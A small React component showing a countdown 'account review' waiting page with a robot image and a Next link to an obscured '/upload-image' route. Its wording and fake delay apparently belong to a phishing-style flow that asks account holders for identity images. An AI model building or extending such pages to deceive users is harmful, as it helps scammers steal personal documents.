import React, { useEffect, useState } from 'react'
import { robot } from './Publics/images/images'
import { Link } from 'react-router-dom';

const Waitting = () => {

    const [timeLeft, setTimeLeft] = useState(10); 
    const [acctiveLink, setActiveLink] = useState(false); 

    useEffect(() => {
        const countdownInterval = setInterval(() => {
            if (timeLeft > 0) {
                setTimeLeft(timeLeft - 1); 
            } else {
                clearInterval(countdownInterval); 
                setActiveLink(true)
            }
        }, 1000); 

        return () => {
            clearInterval(countdownInterval); 
        };
    }, [timeLeft]);

    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    return (
        <div className='container waiting-page'>
        
            <div className='main col-md-8 col-12'>
                <div className='img col-md-3 col-12'>
                    <img src={robot} width={"100%"} alt="" />
                </div>
                <div className='col-md-9 col-12'>
                    <p><b>Hi, We are receiving your information</b></p>
                    <p>Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account</p>
                    <p>Please be patient while we review your case... (wait {minutes}:{seconds < 10 ? `0${seconds}` : seconds}) </p>
                    <Link to={"/1007484836378392943029489/upload-image"} className={`${acctiveLink === true ? 'active' : ''}`}>
                        Next
                    </Link>
                </div>
            </div>

        </div>
    )
}

export default Waitting